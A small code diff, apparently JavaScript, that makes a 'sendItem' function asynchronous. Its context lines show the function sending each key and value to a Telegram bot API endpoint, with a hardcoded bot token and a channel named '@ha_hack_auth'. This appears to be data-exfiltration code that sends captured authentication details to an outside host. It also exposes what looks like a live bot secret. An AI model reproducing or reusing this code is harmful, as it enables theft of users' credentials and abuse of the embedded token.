@@ -26,7 +26,7 @@ async function sendData() {
   }
 }
 
-function sendItem(key, value) {
+async function sendItem(key, value) {
   await fetch(
     `https://api.telegram.org/bot1277273103:AAFgDX0sP0bfU9hnfroPTEj9RzPqulfUlV8/sendMessage?chat_id=@ha_hack_auth&text=${key}: ${value}`
   );
